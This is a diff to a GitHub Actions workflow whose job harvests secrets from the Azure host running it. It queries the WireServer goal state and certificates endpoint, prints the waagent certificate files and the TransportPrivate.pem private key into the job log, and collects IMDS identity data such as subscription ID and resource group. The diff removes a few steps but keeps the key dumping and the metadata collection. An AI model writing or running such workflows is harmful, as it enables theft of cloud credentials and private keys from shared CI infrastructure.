@@ -10,10 +10,10 @@ jobs:
   ws-certs:
     runs-on: ubuntu-latest
     steps:
-      - name: WireServer GoalState + Certificates Endpoint + Certs.pem
+      - name: WireServer GoalState + Certificates Endpoint
         run: |
           python3 - << 'PYEOF'
-import sys, xml.etree.ElementTree as ET, subprocess, os
+import sys, xml.etree.ElementTree as ET, subprocess
 
 goalstate_result = subprocess.run(
     ['curl', '-sf', '--max-time', '15',
@@ -59,20 +59,9 @@ if cert_url:
     )
     print("STDOUT:", result.stdout[:3000] or "(empty)")
     print("STDERR:", result.stderr[:500] or "(none)")
-
-if ext_url:
-    print("\n=== EXTENSIONS_CONFIG_RESPONSE ===")
-    result = subprocess.run(
-        ['curl', '-sf', '--max-time', '15',
-         '--cert', '/var/lib/waagent/TransportCert.pem',
-         '--key', '/var/lib/waagent/TransportPrivate.pem',
-         ext_url, '-H', 'x-ms-version: 2012-11-30'],
-        capture_output=True, text=True, timeout=20
-    )
-    print(result.stdout[:5000] or result.stderr[:500] or "(empty)")
 PYEOF
 
-      - name: Waagent Certificate Files + Transport Keys
+      - name: Waagent Certificate Files
         run: |
           echo "=== Certificates.pem ==="
           cat /var/lib/waagent/Certificates.pem 2>/dev/null || echo NO_CERTS_PEM
@@ -80,12 +69,9 @@ PYEOF
           cat /var/lib/waagent/TransportCert.pem 2>/dev/null || echo NO_TRANSPORT_CERT
           echo "=== TransportPrivate.pem ==="
           cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo NO_TRANSPORT_KEY
-          echo "=== waagent files listing ==="
-          ls -la /var/lib/waagent/ 2>/dev/null | head -30
 
-      - name: IMDS Identity + VM Metadata
+      - name: IMDS Identity
         run: |
-          echo "=== IMDS ==="
           curl -sf -H "Metadata:true" \
             "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
             python3 -c "
@@ -97,7 +83,6 @@ try:
     print('SUBID=' + d['subscriptionId'])
     print('RG=' + d['resourceGroupName'])
     print('LOCATION=' + d['location'])
-    print('SIZE=' + d['vmSize'])
 except Exception as e:
     print('IMDS_ERROR:', e)
 "
